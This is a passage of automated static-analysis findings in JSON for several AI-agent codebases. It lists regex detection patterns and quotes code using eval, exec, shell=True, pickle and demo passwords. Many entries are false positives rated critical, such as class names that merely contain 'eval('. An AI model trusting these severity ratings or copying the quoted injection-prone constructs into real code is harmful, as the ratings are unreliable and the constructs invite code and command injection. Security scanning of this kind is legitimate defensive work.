      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\vector_dbs\\surrealdb\\surreal_db.py",
      "line": 13,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "SURREALDB_USER = \"root\"\nSURREALDB_PASSWORD = \"root\"\nSURREALDB_NAMESPACE = \"test\""
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\user_control_flows\\external_tool_execution.py",
      "line": 30,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    if command.startswith(\"ls\"):\n        return subprocess.check_output(command, shell=True).decode(\"utf-8\")\n    else:"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\user_control_flows\\external_tool_execution_async.py",
      "line": 31,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    if command.startswith(\"ls\"):\n        return subprocess.check_output(command, shell=True).decode(\"utf-8\")\n    else:"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\user_control_flows\\external_tool_execution_async_responses.py",
      "line": 36,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    ):\n        return subprocess.check_output(command, shell=True).decode(\"utf-8\")\n    raise Exception(f\"Unsupported command: {command}\")"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\user_control_flows\\external_tool_execution_stream.py",
      "line": 30,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    if command.startswith(\"ls\"):\n        return subprocess.check_output(command, shell=True).decode(\"utf-8\")\n    else:"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\user_control_flows\\external_tool_execution_stream_async.py",
      "line": 30,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    if command.startswith(\"ls\"):\n        return subprocess.check_output(command, shell=True).decode(\"utf-8\")\n    else:"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\user_control_flows\\external_tool_execution_toolkit.py",
      "line": 38,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        \"\"\"\n        return subprocess.check_output(f\"ls {directory}\", shell=True).decode(\"utf-8\")\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\accuracy\\accuracy_9_11_bigger_or_9_99.py",
      "line": 8,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nevaluation = AccuracyEval(\n    name=\"Comparison Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\evals\\accuracy\\accuracy_async.py",
      "line": 11,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nevaluation = AccuracyEval(\n    model=OpenAIChat(id=\"o4-mini\"),"
    },
    {
      "file": "phidata\\cookbook\\evals\\accuracy\\accuracy_basic.py",
      "line": 8,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nevaluation = AccuracyEval(\n    name=\"Calculator Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\evals\\accuracy\\accuracy_team.py",
      "line": 35,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "# Evaluate the accuracy of the Team's responses\nevaluation = AccuracyEval(\n    name=\"Multi Language Team\","
    },
    {
      "file": "phidata\\cookbook\\evals\\accuracy\\accuracy_with_given_answer.py",
      "line": 6,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nevaluation = AccuracyEval(\n    name=\"Given Answer Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\evals\\accuracy\\accuracy_with_tools.py",
      "line": 8,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nevaluation = AccuracyEval(\n    name=\"Tools Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\async_function.py",
      "line": 20,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nperformance_eval = PerformanceEval(func=arun_agent, num_iterations=10)\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\instantiation_agent.py",
      "line": 11,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ninstantiation_perf = PerformanceEval(\n    name=\"Instantiation Performance\", func=instantiate_agent, num_iterations=1000"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\instantiation_agent_with_tool.py",
      "line": 25,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ninstantiation_perf = PerformanceEval(\n    name=\"Tool Instantiation Performance\", func=instantiate_agent, num_iterations=1000"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\instantiation_team.py",
      "line": 15,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ninstantiation_perf = PerformanceEval(\n    name=\"Instantiation Performance Team\", func=instantiate_team, num_iterations=1000"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\response_with_memory_updates.py",
      "line": 27,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nresponse_with_memory_updates_perf = PerformanceEval(\n    name=\"Memory Updates Performance\", func=run_agent, num_iterations=5, warmup_runs=0"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\response_with_storage.py",
      "line": 21,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nresponse_with_storage_perf = PerformanceEval(\n    name=\"Storage Performance\", func=run_agent, num_iterations=1, warmup_runs=0"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\simple_response.py",
      "line": 18,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nsimple_response_perf = PerformanceEval(\n    name=\"Simple Performance Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\team_response_with_memory_and_reasoning.py",
      "line": 1119,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nteam_response_with_memory_impact = PerformanceEval(\n    name=\"Team Memory Impact\","
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\team_response_with_memory_multi_user.py",
      "line": 130,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nteam_response_with_memory_impact = PerformanceEval(\n    name=\"Team Memory Impact\","
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\team_response_with_memory_simple.py",
      "line": 81,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nteam_response_with_memory_impact = PerformanceEval(\n    name=\"Team Memory Impact\","
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\other\\autogen_instantiation.py",
      "line": 40,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nautogen_instantiation = PerformanceEval(func=instantiate_agent, num_iterations=1000)\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\other\\crewai_instantiation.py",
      "line": 34,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\ncrew_instantiation = PerformanceEval(func=instantiate_agent, num_iterations=1000)\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\other\\langgraph_instantiation.py",
      "line": 29,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nlanggraph_instantiation = PerformanceEval(func=instantiate_agent, num_iterations=1000)\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\other\\openai_agents_instantiation.py",
      "line": 28,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nopenai_agents_instantiation = PerformanceEval(\n    func=instantiate_agent, num_iterations=1000"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\other\\pydantic_ai_instantiation.py",
      "line": 25,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\npydantic_instantiation = PerformanceEval(func=instantiate_agent, num_iterations=1000)\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\performance\\other\\smolagents_instantiation.py",
      "line": 36,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nsmolagents_instantiation = PerformanceEval(func=instantiate_agent, num_iterations=1000)\n"
    },
    {
      "file": "phidata\\cookbook\\evals\\reliability\\reliability_async.py",
      "line": 19,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    response: RunResponse = agent.run(\"What is 10!?\")\n    evaluation = ReliabilityEval(\n        agent_response=response,"
    },
    {
      "file": "phidata\\cookbook\\evals\\reliability\\multiple_tool_calls\\openai\\calculator.py",
      "line": 18,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    )\n    evaluation = ReliabilityEval(\n        name=\"Tool Calls Reliability\","
    },
    {
      "file": "phidata\\cookbook\\evals\\reliability\\single_tool_calls\\google\\calculator.py",
      "line": 15,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    evaluation = ReliabilityEval(\n        name=\"Tool Call Reliability\","
    },
    {
      "file": "phidata\\cookbook\\evals\\reliability\\single_tool_calls\\openai\\calculator.py",
      "line": 16,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    response: RunResponse = agent.run(\"What is 10!?\")\n    evaluation = ReliabilityEval(\n        name=\"Tool Call Reliability\","
    },
    {
      "file": "phidata\\cookbook\\evals\\reliability\\team\\google\\company_info.py",
      "line": 33,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    response: TeamRunResponse = team.run(\"What is the current stock price of NVDA?\")\n    evaluation = ReliabilityEval(\n        name=\"Team Reliability Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\evals\\reliability\\team\\openai\\company_info.py",
      "line": 33,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    response: TeamRunResponse = team.run(\"What is the current stock price of NVDA?\")\n    evaluation = ReliabilityEval(\n        name=\"Team Reliability Evaluation\","
    },
    {
      "file": "phidata\\cookbook\\scripts\\cookbook_runner.py",
      "line": 201,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                try:\n                    subprocess.run([\"cmd\"], check=True, shell=True)  # For Windows\n                except Exception as e:"
    },
    {
      "file": "phidata\\cookbook\\tools\\postgres_tools.py",
      "line": 10,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    user=\"ai\",\n    password=\"ai\",\n    table_schema=\"ai\","
    },
    {
      "file": "phidata\\cookbook\\workflows_2\\sync\\06_workflows_advanced_concepts\\early_stop_workflow_with_step.py",
      "line": 64,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    print(\"\\n=== Testing VULNERABLE code deployment ===\")\n    workflow.print_response(message=\"Scan this code: exec(input('Enter command: '))\")\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\eval\\accuracy.py",
      "line": 34,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def print_eval(self, console: Optional[\"Console\"] = None):\n        from rich.box import ROUNDED"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\eval\\reliability.py",
      "line": 22,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def print_eval(self, console: Optional[\"Console\"] = None):\n        from rich.console import Console"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\eval\\reliability.py",
      "line": 130,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if self.print_results or print_results:\n            self.result.print_eval(console)\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\eval\\reliability.py",
      "line": 223,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if self.print_results or print_results:\n            self.result.print_eval(console)\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\memory\\memory.py",
      "line": 7,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nclass MemoryRetrieval(str, Enum):\n    last_n = \"last_n\""
    },
    {
      "file": "phidata\\libs\\agno\\agno\\memory\\db\\sqlite.py",
      "line": 127,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                for row in result:\n                    memories.append(MemoryRow(id=row.id, user_id=row.user_id, memory=eval(row.memory)))\n        except SQLAlchemyError as e:"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\memory\\v2\\db\\sqlite.py",
      "line": 139,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                            user_id=row.user_id,\n                            memory=eval(row.memory),\n                            last_updated=row.updated_at or row.created_at,"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\models\\base.py",
      "line": 1321,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    try:\n                        python_type = eval(field_type) if isinstance(field_type, str) else field_type\n                    except (NameError, SyntaxError):"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\models\\base.py",
      "line": 1474,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    try:\n                        python_type = eval(field_type) if isinstance(field_type, str) else field_type\n                    except (NameError, SyntaxError):"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\models\\google\\gemini.py",
      "line": 210,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                Tool(\n                    google_search=GoogleSearchRetrieval(\n                        dynamic_retrieval_config=DynamicRetrievalConfig("
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 296,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    # Get current absolute path first\n                    result = current_sandbox.process.exec(f\"cd {cwd} && pwd\", cwd=\"/\")\n                    current_abs_path = Path(result.result.strip())"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 304,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Test if directory exists\n                test_result = current_sandbox.process.exec(\n                    f\"test -d {new_path_str} && echo 'exists' || echo 'not found'\", cwd=\"/\""
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 314,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Execute the command\n            response = current_sandbox.process.exec(command, cwd=cwd)\n            return response.result"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 345,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            if parent_dir and parent_dir != \"/\":\n                result = current_sandbox.process.exec(f\"mkdir -p {parent_dir}\")\n                if result.exit_code != 0:"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 353,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            command = f\"cat > '{path_str}' << 'EOF'\\n{escaped_content}\\nEOF\"\n            result = current_sandbox.process.exec(command)\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 384,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Read file using cat\n            result = current_sandbox.process.exec(f\"cat '{path_str}'\")\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 417,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # List files using ls -la for detailed info\n            result = current_sandbox.process.exec(f\"ls -la '{path_str}'\")\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 448,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Check if it's a directory or file\n            check_result = current_sandbox.process.exec(f\"test -d '{path_str}' && echo 'directory' || echo 'file'\")\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 452,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Remove directory recursively\n                result = current_sandbox.process.exec(f\"rm -rf '{path_str}'\")\n            else:"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\daytona.py",
      "line": 455,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Remove file\n                result = current_sandbox.process.exec(f\"rm -f '{path_str}'\")\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\function.py",
      "line": 57,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            name=data[\"name\"],\n            field_type=eval(data[\"field_type\"]),  # Convert string type name to actual type\n            description=data[\"description\"],"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\tools\\python.py",
      "line": 164,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            log_debug(f\"Running code:\\n\\n{code}\\n\\n\")\n            exec(code, self.safe_globals, self.safe_locals)\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\utils\\functions.py",
      "line": 36,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n                _arguments = ast.literal_eval(arguments)\n        except Exception as e:"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\utils\\pickle.py",
      "line": 9,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "    \"\"\"Pickles and saves object to file_path\"\"\"\n    import pickle\n"
    },
    {
      "file": "phidata\\libs\\agno\\agno\\utils\\pickle.py",
      "line": 21,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "    \"\"\"\n    import pickle\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_bitbucket.py",
      "line": 56,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "            username=\"custom_user\",\n            password=\"custom_password\",\n            api_version=\"2.1\","
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_bitbucket.py",
      "line": 70,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "        tools = BitbucketTools(\n            workspace=\"test_workspace\", repo_slug=\"test_repo\", token=\"test_token\", password=\"test_password\"\n        )"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_custom_api.py",
      "line": 18,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "        username=\"test_user\",\n        password=\"test_pass\",\n        api_key=\"test_key\","
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_custom_api.py",
      "line": 75,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "        username=\"custom_user\",\n        password=\"custom_pass\",\n        api_key=\"custom_key\","
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 144,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.get_directions(origin=\"Test Origin\", destination=\"Test Destination\"))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 156,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.validate_address(\"123 Test St\"))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 168,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.geocode_address(\"123 Test St\"))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 179,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.reverse_geocode(40.7128, -74.0060))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 190,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.get_distance_matrix(origins=[\"Origin\"], destinations=[\"Destination\"]))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 202,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.get_elevation(40.7128, -74.0060))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_google_maps.py",
      "line": 214,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        result = eval(google_maps_tools.get_timezone(40.7128, -74.0060, test_time))\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_oxylabs.py",
      "line": 64,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "        \"\"\"Test initialization with provided credentials.\"\"\"\n        tools = OxylabsTools(username=\"test_user\", password=\"test_pass\")\n"
    },
    {
      "file": "phidata\\libs\\agno\\tests\\unit\\tools\\test_postgres.py",
      "line": 68,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "                user=\"testuser\",\n                password=\"testpassword\",\n                table_schema=\"company_data\","
    },
    {
      "file": "PraisonAI\\examples\\python\\agents\\math-agent.py",
      "line": 19,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        safe_expr = re.sub(r'[^0-9+\\-*/().,\\s]', '', expression)\n        result = eval(safe_expr)\n        return f\"Result: {result}\""
    },
    {
      "file": "PraisonAI\\examples\\python\\custom_tools\\tools_with_latency.py",
      "line": 52,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    try:\n        result = eval(expression)\n        return f\"Result: {result}\""
    },
    {
      "file": "PraisonAI\\examples\\python\\tools\\cli\\app.py",
      "line": 10,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    try:\n        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        print(f\"Command output: {result}\")"
    },
    {
      "file": "PraisonAI\\examples\\python\\tools\\e2b\\single_agent.py",
      "line": 43,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    try:\n        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        print(f\"Command output: {result}\")"
    },
    {
      "file": "PraisonAI\\src\\praisonai\\tests\\test.py",
      "line": 62,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            \n        result = subprocess.run(command, shell=True, capture_output=True, text=True, env=env)\n        return result.stdout + result.stderr"
    },
    {
      "file": "PraisonAI\\src\\praisonai\\tests\\test_custom_tools_fix.py",
      "line": 63,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    try:\n        result = eval(expression)\n        return f\"Result: {result}\""
    },
    {
      "file": "PraisonAI\\src\\praisonai\\tests\\unit\\test_async_agents.py",
      "line": 194,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                result = eval(expression)  # Simple eval for testing\n                return f\"Result: {result}\""
    },
    {
      "file": "PraisonAI\\src\\praisonai\\tests\\unit\\test_tools_and_ui.py",
      "line": 24,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                result = eval(expression)  # Simple eval for testing\n                return f\"Result: {result}\""
    },
    {
      "file": "PraisonAI\\src\\praisonai-agents\\run_with_langtrace.py",
      "line": 32,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    # Execute in the same namespace\n    exec(script_content, {'__name__': '__main__'})\n"
    },
    {
      "file": "PraisonAI\\src\\praisonai-agents\\praisonaiagents\\tools\\calculator_tools.py",
      "line": 77,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Evaluate expression\n            result = eval(expression, safe_dict)\n            "
    },
    {
      "file": "PraisonAI\\src\\praisonai-agents\\praisonaiagents\\tools\\python_tools.py",
      "line": 153,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    if tree.body and isinstance(tree.body[-1], ast.Expr):\n                        result = eval(\n                            compile(ast.Expression(tree.body[-1].value), '<string>', 'eval'),"
    },
    {
      "file": "PraisonAI\\src\\praisonai-agents\\praisonaiagents\\tools\\python_tools.py",
      "line": 147,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                with redirect_stdout(stdout_buffer), redirect_stderr(stderr_buffer):\n                    exec(compiled_code, globals_dict, locals_dict)\n                    "
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\agency-swarm\\agency_swarm\\tools\\ToolFactory.py",
      "line": 140,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        exec(result, exec_globals)\n        model = exec_globals.get(\"Model\")"
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\agency-swarm\\agency_swarm\\tools\\ToolFactory.py",
      "line": 328,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import_path = import_path.lstrip(\".\")\n            exec(f\"from {import_path} import {class_name}\", exec_globals)\n        # importing from current working directory"
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\agency-swarm\\agency_swarm\\tools\\ToolFactory.py",
      "line": 333,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            sys.path.append(current_working_directory)\n            exec(f\"from {import_path} import {class_name}\", exec_globals)\n"
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\OpenAI_Agent_Swarm\\agents\\tool_maker\\tool_user.py",
      "line": 59,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        functions.update({func: eval(func)})\n"
    },
    {
      "file": "SECURITY_BACKUPS\\backup_1755822050\\OpenAI_Agent_Swarm\\agents\\tool_maker\\tool_user.py",
      "line": 57,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        with open('tools/' + func + '.py') as f:\n            exec(f.read(), globals())\n"
    },
    {
